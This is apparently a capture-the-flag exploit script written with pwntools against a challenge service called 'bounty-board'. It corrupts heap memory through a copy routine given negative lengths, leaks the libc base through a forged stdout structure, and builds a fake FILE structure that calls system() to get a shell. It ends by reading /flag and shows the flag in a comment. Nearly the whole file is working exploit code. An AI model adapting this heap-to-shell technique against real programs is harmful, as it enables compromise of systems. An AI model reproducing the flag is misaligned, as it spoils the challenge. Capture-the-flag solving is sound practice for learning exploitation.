from pwn import *
from subprocess import check_output
import os

class HexInt(int):
    def __new__(self, val, *args, **kwargs):
        return super().__new__(self, val, *args, **kwargs)

    def __repr__(self):
        return f"{self:#x}"
    
cnt = 0
def create(size: int, data: bytes):
    global cnt
    id = cnt
    cnt += 1
    p.sendlineafter(b"> ", b"0")
    p.sendlineafter(b": ", f"{size}".encode())
    p.send(data)
    return id

def copy(dst: int, src: int, len: int):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b": ", f"{dst}".encode())
    p.sendlineafter(b": ", f"{src}".encode())
    p.sendlineafter(b": ", f"{len}".encode())

def mark(name: bytes, size: int):
    ret = b""
    for i in range(0, size, 8):
        ret += name.ljust(4, b"\0") + p32(i)
    return bytearray(ret)

context.arch = "amd64"
context.terminal = ["kitty"]

while True:
    print("")
    cnt = 0
    with context.quiet:
        p = remote("bounty-board.chal.pwni.ng", "1337")
        # p = remote("localhost", 1337)

    payload = mark(b"AAAA", 0x40)
    payload[0x28:0x30] = p64(0xcf0)
    a = create(0x40, payload)
    b = create(0x27, b"B" * 0x27)

    """
    oob = rdi + len - 0x80
    data = rsi + len - 0x80
    """
    """
    0x76bf36abdb6b:	vmovdqu ymm5,YMMWORD PTR [rsi+rdx*1-0x20]
    0x76bf36abdb71:	vmovdqu ymm6,YMMWORD PTR [rsi+rdx*1-0x40]
    0x76bf36abdb77:	mov    rcx,rdi
    0x76bf36abdb7a:	or     rdi,0x1f
    0x76bf36abdb7e:	vmovdqu ymm7,YMMWORD PTR [rsi+rdx*1-0x60]
    0x76bf36abdb84:	vmovdqu ymm8,YMMWORD PTR [rsi+rdx*1-0x80]
    0x76bf36abdb8a:	sub    rsi,rcx
    0x76bf36abdb8d:	inc    rdi
    0x76bf36abdb90:	add    rsi,rdi
    0x76bf36abdb93:	lea    rdx,[rcx+rdx*1-0x80]
    0x76bf36abdb98:	nop    DWORD PTR [rax+rax*1+0x0]
    0x76bf36abdba0:	vmovdqu ymm1,YMMWORD PTR [rsi]
    0x76bf36abdba4:	vmovdqu ymm2,YMMWORD PTR [rsi+0x20]
    0x76bf36abdba9:	vmovdqu ymm3,YMMWORD PTR [rsi+0x40]
    0x76bf36abdbae:	vmovdqu ymm4,YMMWORD PTR [rsi+0x60]
    0x76bf36abdbb3:	sub    rsi,0xffffffffffffff80
    0x76bf36abdbb7:	vmovdqa YMMWORD PTR [rdi],ymm1
    0x76bf36abdbbb:	vmovdqa YMMWORD PTR [rdi+0x20],ymm2
    0x76bf36abdbc0:	vmovdqa YMMWORD PTR [rdi+0x40],ymm3
    0x76bf36abdbc5:	vmovdqa YMMWORD PTR [rdi+0x60],ymm4
    0x76bf36abdbca:	sub    rdi,0xffffffffffffff80
    0x76bf36abdbce:	cmp    rdx,rdi
    0x76bf36abdbd1:	ja     0x76bf36abdba0
    0x76bf36abdbd3:	vmovdqu YMMWORD PTR [rdx+0x60],ymm5
    0x76bf36abdbd8:	vmovdqu YMMWORD PTR [rdx+0x40],ymm6
    0x76bf36abdbdd:	vmovdqu YMMWORD PTR [rdx+0x20],ymm7
    0x76bf36abdbe2:	vmovdqu YMMWORD PTR [rdx],ymm8
    0x76bf36abdbe6:	vmovdqu YMMWORD PTR [rcx],ymm0
    0x76bf36abdbea:	vzeroupper
    0x76bf36abdbed:	ret
    """

    copy(b, a, -1)

    p.sendlineafter(b"> ", b"0" * 0x1000 + b"0")
    p.sendlineafter(b": ", f"{0x37}".encode())
    p.send(b"X" * 0x37)
    c = cnt
    cnt += 1

    create(2, p16(0x45c0))

    copy(a, c, -1)

    copy(a, b, -1)

    log.info(f"shifting {-0x50:#x}")
    copy(a, b, -0x50 * 1)
    copy(a, b, -0x50 * 2)
    copy(a, b, -0x50 * 3)
    log.info(f"shifting {-0x50 * 4:#x}")
    copy(a, b, -0x50 * 4)
    copy(a, b, -0x50 * 5)
    copy(a, b, -0x2a0 + 0x100)
    log.info(f"shifting {-0x2a0 + 0x100:#x}")
    copy(a, b, -0x2a0 + 0x100)

    # leaksize = 0xc0
    leaksize = 0x60
    create(leaksize - 9, p64(0xfbad1800) + p64(0) * 3 + b"\n")

    try:
        leak = p.recvuntil(b"[[")[6:]
    except EOFError:
        log.warn("leak failed")
        with context.quiet:
            p.close()
        continue

    print(leak)
    qwords = [HexInt(u64(leak[i:i+8].ljust(8, b"\0"))) for i in range(0, len(leak), 8)]
    print(qwords)
    qwords = filter(lambda n: n >> 44 == 7, qwords)
    qwords = list(qwords)
    print(qwords)

    base = None
    for qword in qwords:
        fixed = qword & 0xfff
        match fixed:
            # case 0x2c0:
            #     base = qword - 0x2042c0
            case 0x643:
                base = qword - 0x204643
            # case 0x3c0:
            #     base = qword - 0x2043c0
        if base is not None: break

    if base is None:
        log.warn("failed to get libc base")
        with context.quiet:
            p.close()
        continue

    libc = ELF("./libc.so.6", checksec=False)
    libc.address = base
    null = base + 0x203010
    fp_addr = libc.sym._IO_2_1_stdout_

    log.info(f"{base = :#x}")
    log.info(f"{null = :#x}")

    log.info(f"{fp_addr = :#x}")
    fp = FileStructure(null=null)
    fp.flags = 0x687320
    fp._IO_read_ptr = 0x0
    fp._IO_write_base = 0x0
    fp._IO_write_ptr = 0x1
    fp._wide_data = fp_addr-0x10
    payload = bytes(fp)
    payload = payload[:0xc8] + p64(libc.sym.system) + p64(fp_addr + 0x60)
    payload += p64(libc.sym._IO_wfile_jumps)

    log.info(f"{len(payload) = :#x}")

    create(0xf7, payload + b"\n")
    sleep(1)
    p.sendline("cat /flag")
    p.interactive()
    break

# PCTF{t4m1ng_7h3_wildc0py_in_th3_wi1d_wild_w3st}